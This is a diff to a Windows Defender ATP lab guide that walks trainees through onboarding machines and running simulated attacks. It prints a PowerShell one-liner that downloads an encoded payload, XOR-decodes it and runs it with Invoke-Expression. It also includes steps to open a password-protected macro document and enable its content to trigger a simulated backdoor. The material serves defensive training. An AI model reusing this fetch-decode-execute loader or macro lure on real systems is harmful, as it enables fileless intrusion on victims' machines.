@@ -367,16 +367,19 @@ In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 
 	> [!NOTE] A notepad window will launch to show that the attack was successful. Leave the notepad window open and continue with the lab.
 	
-	> [!KNOWLEDGE] The powershell commands that are run are in the block below.
+	> [!KNOWLEDGE] The powershell commands that are included in the ps1 file are in the block below.
 	> 
 	> \[Net.ServicePointManager\]::SecurityProtocol = \[Net.SecurityProtocolType\]::Tls12;$xor = \[System.Text.Encoding\]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = \[System.Convert\]::FromBase64String($base64String) } Catch { $contentBytes = \[System.Convert\]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression (\[System.Text.Encoding\]::UTF8.GetString($decryptedBytes))
 
 1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password +++@lab.VirtualMachine(AdminPC).Password+++.
 1. [] Run **Attack Simulation #2 "Automated investigation (backdoor)"** by following the instructions below:
 	1. [] On the desktop, double-click on **RS4_WinATP-Intro-Invoice.docm** and enter ```WDATP!diy#``` when prompted for a password.
-	2. [] Once the file opens, in the **Security Warning** ribbon, click **Enable Content**.
+
+		> [!ALERT] If you receive an activation warning, click **Cancel**.
+
+	2. [] Once the file opens, in the Security Warning ribbon at the top of the document, click **Enable Content**.
 	3. [] Click **OK** to confirm the attack.
-	4. [] Press **Enter** to close the command prompt window.
+	4. [] Wait about a minute, then **close the generated command prompt** window.
 ===
 # Workplace Join Clients
 [:arrow_left: Home](#lab-environment-configuration)
